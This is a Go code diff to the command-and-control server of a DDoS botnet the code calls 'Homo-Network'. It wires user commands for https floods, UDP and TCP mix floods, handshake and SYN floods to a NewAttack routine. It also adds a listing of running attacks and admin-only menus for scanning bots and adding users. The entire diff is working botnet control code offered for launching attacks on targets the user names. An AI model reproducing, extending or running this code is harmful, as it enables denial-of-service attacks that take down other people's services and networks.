@@ -9,7 +9,10 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"text/tabwriter"
+	"time"
 
+	"github.com/LsdDance/sencoding"
 	"github.com/fatih/color"
 	"github.com/iskaa02/qalam/gradient"
 )
@@ -79,6 +82,7 @@ func CommandManager(conn net.Conn) {
 		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
 		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "https", cmd[1], cmd[2])
 
 	} else if strings.HasPrefix(string(line), "!udpmix") {
 		cmd := strings.Split(string(line), " ")
@@ -96,6 +100,8 @@ func CommandManager(conn net.Conn) {
 		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 
+		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "udpmix", cmd[1], cmd[2])
+
 	} else if strings.HasPrefix(string(line), "!handshake") {
 		cmd := strings.Split(string(line), " ")
 		fmt.Println(cmd)
@@ -112,6 +118,8 @@ func CommandManager(conn net.Conn) {
 		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 
+		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "handshake", cmd[1], cmd[2])
+
 	} else if strings.HasPrefix(string(line), "!tcpmix") {
 		cmd := strings.Split(string(line), " ")
 		fmt.Println(cmd)
@@ -127,6 +135,7 @@ func CommandManager(conn net.Conn) {
 		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
 		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "tcpmix", cmd[1], cmd[2])
 
 	} else if strings.HasPrefix(string(line), "!syn") {
 		cmd := strings.Split(string(line), " ")
@@ -143,16 +152,63 @@ func CommandManager(conn net.Conn) {
 		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
 		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "syn", cmd[1], cmd[2])
 
-	} else if strings.HasPrefix(string(line), "!scanner") {
+	} else if strings.HasPrefix(string(line), "scanner") {
 		if s.Login != config.GetConfig().Cnc.AdmLogin {
 			Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
 			CommandManager(conn)
 		}
 		go server.Scan()
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
-	} else if strings.HasPrefix(string(line), "help") || strings.HasPrefix(string(line), "methods") {
+	} else if strings.HasPrefix(string(line), "running") {
 
+		if len(AttacksMap) < 1 {
+			Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("No active attacks\n"), conn)
+			return
+		}
+
+		tab := strings.Builder{}
+
+		w := tabwriter.NewWriter(&tab, 10, 10, 4, ' ', tabwriter.TabIndent)
+		fmt.Fprintf(w, "\n%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r", "  #", "Target", "Method", "Port", "Length", "Finish", "User")
+		fmt.Fprintf(w, "\n%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r", "-----", "------", "------", "----", "------", "------", "------")
+		var x int
+		for _, i := range AttacksMap {
+			x++
+			_login := sencoding.Decode(i.Login)
+			login := strings.Split(_login, "|")
+
+			fmt.Fprintf(w, "\n%d\t%s\t%s\t%s\t%s\t%s\t%s\t\r", x, strings.TrimPrefix(i.Target, "https://"), i.Method, i.Port, strconv.Itoa(i.Duration), strconv.Itoa(i.Finish), login[0])
+			fmt.Fprintln(w)
+		}
+
+		w.Flush()
+		Print(tab.String(), conn)
+
+	} else if strings.HasPrefix(string(line), "help") {
+
+		conn.Write([]byte("\n"))
+
+		if s.Login == config.GetConfig().Cnc.AdmLogin { // adm help
+
+			conn.Write([]byte(color.HiWhiteString("\tAdmin Help Menu\n\r")))
+
+			conn.Write([]byte(color.HiWhiteString("scanner\t\t| Scan your bots\n\r")))
+			conn.Write([]byte(color.HiWhiteString("bots\t\t| Bots count\n\r")))
+			conn.Write([]byte(color.HiWhiteString("adduser\t\t| Add user\n\r")))
+			conn.Write([]byte(color.HiWhiteString("methods\t\t| Botnet methods\n\r")))
+			conn.Write([]byte(color.HiWhiteString("running\t\t| Active attacks\n\r")))
+
+		} else {
+			conn.Write([]byte(color.HiWhiteString("methods\t\t| Botnet methods\n\r")))
+			conn.Write([]byte(color.HiWhiteString("running\t\t| Active attacks\n\r")))
+
+		}
+
+		conn.Write([]byte("\n"))
+
+	} else if strings.HasPrefix(string(line), "methods") {
 		conn.Write([]byte("\n"))
 
 		conn.Write([]byte(color.HiWhiteString("!https: Basic https flood\t\t| Type: L7\n\r")))
@@ -169,7 +225,7 @@ func CommandManager(conn net.Conn) {
 	} else if strings.HasPrefix(string(line), "exit") || strings.HasPrefix(string(line), "kill") {
 		conn.Close()
 		return
-	} else if strings.HasPrefix(string(line), "!adduser") {
+	} else if strings.HasPrefix(string(line), "adduser") {
 
 		if s.Login != config.GetConfig().Cnc.AdmLogin {
 			Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
@@ -182,7 +238,7 @@ func CommandManager(conn net.Conn) {
 		args := strings.Split(line, " ")
 
 		if len(args) < 2 {
-			Print(gradient.Rainbow().Apply("!adduser <LOGIN> <PASSWORD>\n\r"), conn)
+			Print(gradient.Rainbow().Apply("adduser <LOGIN> <PASSWORD>\n\r"), conn)
 			CommandManager(conn)
 		}
 
@@ -205,6 +261,11 @@ func CommandManager(conn net.Conn) {
 			Print(gradient.Rainbow().Apply(list+"\n"), conn)
 		}
 	} else {
+		if bytes.HasPrefix(line, []byte{13, 10, 0, 0, 0, 0, 0}) {
+			CommandManager(conn)
+			return
+		}
+
 		Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
 	}
 	CommandManager(conn)
